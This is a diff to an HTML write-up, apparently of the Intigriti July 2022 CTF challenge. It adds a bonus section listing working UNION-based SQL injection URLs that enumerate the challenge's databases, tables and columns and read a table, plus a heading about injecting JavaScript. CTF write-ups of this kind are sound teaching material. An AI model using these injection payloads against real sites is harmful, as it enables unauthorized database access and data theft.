@@ -97,6 +97,10 @@
     <code class="lang-html">?month=1 UNION SELECT 1,2,1,1 OR 2 LIMIT 1,1,1</code>
     </p>
 	<div class="center"><img src="images/pages/2/7.png"></div>
+
+	<p style="font-size: 20px;">
+    &#187; <b>Using author id to send malicious javascript</b><br>
+    </p>
 	<p style="font-size: 20px;">
     Idea behind this was to make the second query return data about user with id=2, <code class="lang-sql">1 OR 2</code> would return data about both users and <code class="lang-sql">LIMIT 1,1</code> would LIMIT the returned data to only the data about the second user.
     If it would work, I would know that we can also modify the second query.
@@ -190,9 +194,49 @@
     </p>
 
 
+	<br>
+	<br>
+	<br>
+	<br>
+	<p style="font-size: 20px;">
+    &#187; <b><u>Bonus:</u>Getting Rick Rolled</b><br>
+    </p>
+
+	<p style="font-size: 20px;">
+    Goal of the challenge was to execute javascript, however it all started with an SQLi. Becuse output from SQL query was reflected I wanted to 
+    try and get contents of database.</br>
+    1. find all databases that we have access to :</br>
+    <pre>
+    <code class="lang-html">https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20UNION%20SELECT%20DISTINCT%20%20NULL,%20TABLE_SCHEMA,%20NULL%20,%20NULL,%20NULL%20%20FROM%20%20information_schema.tables#</code>
+    </pre>
+    <div class="center"><img src="images/pages/2/11.png"></div></br>
+	<p style="font-size: 20px;">
+    2. find all tables in blog database: </br>
+    <pre>
+    <code class="lang-html">https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20UNION%20SELECT%20DISTINCT%20%20NULL,%20TABLE_NAME,%20NULL%20,%20NULL,%20NULL%20%20FROM%20%20information_schema.tables%20WHERE%20TABLE_SCHEMA%20=0x626c6f67#</code>
+    </pre>
+    </p>
+    <div class="center"><img src="images/pages/2/12.png"></div></br>
+
+	<p style="font-size: 20px;">
+    3. find all columns in blog tables:</br>
+    <pre>
+    <code class="lang-html">https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20UNION%20SELECT%20NULL,%20COLUMN_NAME,%20NULL,%20NULL,TABLE_NAME%20FROM%20information_schema.columns%20WHERE%
+        20TABLE_SCHEMA%20=%200x626c6f67#</code></pre>
+    </p>
+    <div class="center"><img src="images/pages/2/13.png"></div></br>
+
+	<p style="font-size: 20px;">
+    4. Getting Rick rolled.</br>
+    <pre>
+    <code class="lang-html">https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20UNION%20SELECT%20NULL,id,NULL,NULL,videoid%20FROM%20youtube#</code>
+    </pre>
+    </p>
+    <div class="center"><img src="images/pages/2/14.png"></div></br>
 
 	<p style="font-size: 20px;">
 	&emsp; Thank you for taking your time and reading this :) and stay safe - dont use js.
+    </p>
 	<br>
 	<br>
 	<br>
